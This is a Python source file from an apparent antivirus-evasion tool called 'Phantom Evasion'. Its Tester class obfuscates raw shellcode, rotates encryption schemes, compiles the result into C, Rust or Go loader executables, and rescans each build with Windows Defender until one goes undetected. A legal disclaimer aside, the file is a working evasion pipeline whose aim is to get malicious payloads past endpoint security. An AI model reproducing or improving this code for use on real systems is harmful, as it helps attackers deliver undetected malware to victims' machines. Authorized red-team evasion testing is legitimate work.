"""
Phantom Evasion - AV/EDR Testing Engine

LEGAL DISCLAIMER:
For authorized penetration testing and security research ONLY.
Users must have explicit written permission from the target system owner.
"""

import copy
import random
from typing import Dict, Any, Optional


class Tester:
    """Drive iterative obfuscation-and-test loops against AV/EDR engines."""

    def test_with_defender(self, payload_path: str) -> Dict[str, Any]:
        """Test *payload_path* against Windows Defender via MpCmdRun.

        Delegates to :func:`av_test.defender_scan.scan_with_defender`.

        Args:
            payload_path: Path to the compiled payload binary.

        Returns:
            Dict with keys:
                - ``detected`` (bool)
                - ``threat_name`` (str)
                - ``status`` (str)
        """
        from av_test.defender_scan import scan_with_defender
        return scan_with_defender(payload_path)

    def iterative_test(
        self,
        shellcode: bytes,
        config: Dict[str, Any],
        max_iterations: int = 10,
    ) -> Dict[str, Any]:
        """Iteratively obfuscate and test until the payload bypasses AV.

        Each iteration randomises the encryption scheme and obfuscation seed
        before re-testing. This is a best-effort approach: the actual
        compilation and scanning pipeline must be available on the host.

        Args:
            shellcode:      Raw shellcode bytes.
            config:         Pipeline configuration dict.
            max_iterations: Maximum number of iterations before giving up.

        Returns:
            Dict with keys:
                - ``bypassed`` (bool)  – True if AV was bypassed.
                - ``iterations`` (int) – Number of iterations performed.
                - ``last_result`` (dict) – Last scan result from the AV engine.
                - ``final_config`` (dict) – Config used on the final iteration.
        """
        from core.obfuscator import Obfuscator
        from core.compiler import Compiler

        obfuscator = Obfuscator()
        compiler = Compiler()

        encryption_schemes = ["xor", "aes", "rc4", "chacha20"]
        current_config = copy.deepcopy(config)
        last_result: Dict[str, Any] = {}

        for iteration in range(1, max_iterations + 1):
            # Rotate encryption scheme each iteration for variety
            current_config["encryption"] = encryption_schemes[(iteration - 1) % len(encryption_schemes)]

            try:
                obfuscated = obfuscator.apply_all_layers(shellcode, current_config)

                output_path = config.get("output_file", "output/payload_iter")
                loader = current_config.get("loader", "c")

                import os
                from pathlib import Path
                Path(output_path).parent.mkdir(parents=True, exist_ok=True)

                out_bin = f"{output_path}_iter{iteration}.exe"
                template_base = Path(__file__).parent.parent / "templates"
                template_map = {
                    "c": str(template_base / "loader_c.c"),
                    "rust": str(template_base / "loader_rust.rs"),
                    "go": str(template_base / "loader_go.go"),
                }
                template_path = template_map.get(loader, str(template_base / "loader_c.c"))
                compile_fn = {
                    "c": compiler.compile_c,
                    "rust": compiler.compile_rust,
                    "go": compiler.compile_go,
                }.get(loader, compiler.compile_c)

                compiled = compile_fn(template_path, out_bin, obfuscated)
                if not compiled:
                    # Compiler not available – cannot perform AV test
                    last_result = {
                        "detected": None,
                        "threat_name": "",
                        "status": "compiler_unavailable",
                    }
                    break

                last_result = self.test_with_defender(out_bin)
                if not last_result.get("detected", True):
                    return {
                        "bypassed": True,
                        "iterations": iteration,
                        "last_result": last_result,
                        "final_config": current_config,
                    }

            except Exception as exc:
                last_result = {
                    "detected": None,
                    "threat_name": "",
                    "status": f"error: {exc}",
                }

        return {
            "bypassed": False,
            "iterations": max_iterations,
            "last_result": last_result,
            "final_config": current_config,
        }
